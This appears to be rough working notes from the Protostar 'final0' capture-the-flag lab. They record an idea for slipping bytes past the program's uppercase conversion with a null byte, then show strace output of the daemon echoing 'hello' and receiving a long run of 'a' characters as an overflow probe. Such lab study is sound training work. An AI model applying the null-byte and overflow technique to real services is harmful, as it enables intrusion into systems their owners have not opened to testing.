there is strlen(buffer) convert to uppper case we can use null byte '\0'
get() can take also null byte
so we can ignore using null byte


there is also \r and \n is replace by \0 so it also work


Terminal 1::


root@protostar:/opt/protostar/bin# ./final0
root@protostar:/opt/protostar/bin# killall final0
root@protostar:/opt/protostar/bin# strace -f ./final0
execve("./final0", ["./final0"], [/* 15 vars */]) = 0
brk(0)                                  = 0x804b000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fe0000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=13796, ...}) = 0
mmap2(NULL, 13796, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fdc000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\320m\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1319176, ...}) = 0
mmap2(NULL, 1329480, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7e97000
mprotect(0xb7fd5000, 4096, PROT_NONE)   = 0
mmap2(0xb7fd6000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x13e) = 0xb7fd6000
mmap2(0xb7fd9000, 10568, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7fd9000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e96000
set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e966c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0xb7fd6000, 8192, PROT_READ)   = 0
mprotect(0xb7ffe000, 4096, PROT_READ)   = 0
munmap(0xb7fdc000, 13796)               = 0
rt_sigaction(SIGCHLD, {0x8048d64, [CHLD], SA_RESTART}, {SIG_DFL, [], 0}, 8) = 0
rt_sigaction(SIGPIPE, {SIG_IGN, [PIPE], SA_RESTART}, {SIG_DFL, [], 0}, 8) = 0
open("/opt/protostar/run/final0.pid", O_RDWR|O_CREAT|O_TRUNC, 0700) = 3
setgroups32(1, [0])                     = 0
setresgid32(0, 0, 0)                    = 0
setresuid32(0, 0, 0)                    = 0
clone(Process 1869 attached
child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e96728) = 1869
[pid  1868] exit_group(0)               = ?
setsid()                                = 1869
chdir("/")                              = 0
open("/dev/null", O_RDWR)               = 4
fstat64(4, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
dup2(4, 0)                              = 0
dup2(4, 1)                              = 1
dup2(4, 2)                              = 2
close(4)                                = 0
write(3, "1869\n", 5)                   = 5
close(3)                                = 0
socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
bind(3, {sa_family=AF_INET, sin_port=htons(2995), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
listen(3, 10)                           = 0
accept(3, {sa_family=AF_INET, sin_port=htons(60442), sin_addr=inet_addr("127.0.0.1")}, [16]) = 4
clone(Process 1875 attached
child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e96728) = 1875
[pid  1869] close(4)                    = 0
[pid  1869] accept(3,  <unfinished ...>
[pid  1875] close(3)                    = 0
[pid  1875] dup2(4, 0)                  = 0
[pid  1875] dup2(4, 1)                  = 1
[pid  1875] dup2(4, 2)                  = 2
[pid  1875] read(0, "h", 1)             = 1
[pid  1875] read(0, "e", 1)             = 1
[pid  1875] read(0, "l", 1)             = 1
[pid  1875] read(0, "l", 1)             = 1
[pid  1875] read(0, "o", 1)             = 1
[pid  1875] read(0, "\n", 1)            = 1
[pid  1875] brk(0)                      = 0x804b000
[pid  1875] brk(0x806c000)              = 0x806c000
[pid  1875] write(1, "No such user HELLO\n", 19) = 19
[pid  1875] exit_group(19)              = ?
Process 1875 detached
<... accept resumed> 0xbffff7a8, [16])  = ? ERESTARTSYS (To be restarted)
--- SIGCHLD (Child exited) @ 0 (0) ---
wait4(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 19}], 0, NULL) = 1875
sigreturn()                             = ? (mask now [])
accept(3, 0xbffff7a8, [16])             = ? ERESTARTSYS (To be restarted)
--- SIGTERM (Terminated) @ 0 (0) ---
Process 1869 detached
root@protostar:/opt/protostar/bin# strace -f ./final0
execve("./final0", ["./final0"], [/* 15 vars */]) = 0
brk(0)                                  = 0x804b000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fe0000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=13796, ...}) = 0
mmap2(NULL, 13796, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fdc000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\320m\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1319176, ...}) = 0
mmap2(NULL, 1329480, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7e97000
mprotect(0xb7fd5000, 4096, PROT_NONE)   = 0
mmap2(0xb7fd6000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x13e) = 0xb7fd6000
mmap2(0xb7fd9000, 10568, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7fd9000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e96000
set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e966c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0xb7fd6000, 8192, PROT_READ)   = 0
mprotect(0xb7ffe000, 4096, PROT_READ)   = 0
munmap(0xb7fdc000, 13796)               = 0
rt_sigaction(SIGCHLD, {0x8048d64, [CHLD], SA_RESTART}, {SIG_DFL, [], 0}, 8) = 0
rt_sigaction(SIGPIPE, {SIG_IGN, [PIPE], SA_RESTART}, {SIG_DFL, [], 0}, 8) = 0
open("/opt/protostar/run/final0.pid", O_RDWR|O_CREAT|O_TRUNC, 0700) = 3
setgroups32(1, [0])                     = 0
setresgid32(0, 0, 0)                    = 0
setresuid32(0, 0, 0)                    = 0
clone(Process 1889 attached
child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e96728) = 1889
[pid  1888] exit_group(0)               = ?
setsid()                                = 1889
chdir("/")                              = 0
open("/dev/null", O_RDWR)               = 4
fstat64(4, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
dup2(4, 0)                              = 0
dup2(4, 1)                              = 1
dup2(4, 2)                              = 2
close(4)                                = 0
write(3, "1889\n", 5)                   = 5
close(3)                                = 0
socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
bind(3, {sa_family=AF_INET, sin_port=htons(2995), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
listen(3, 10)                           = 0
accept(3, {sa_family=AF_INET, sin_port=htons(60443), sin_addr=inet_addr("127.0.0.1")}, [16]) = 4
clone(Process 1892 attached
child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e96728) = 1892
[pid  1889] close(4)                    = 0
[pid  1889] accept(3,  <unfinished ...>
[pid  1892] close(3)                    = 0
[pid  1892] dup2(4, 0)                  = 0
[pid  1892] dup2(4, 1)                  = 1
[pid  1892] dup2(4, 2)                  = 2
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
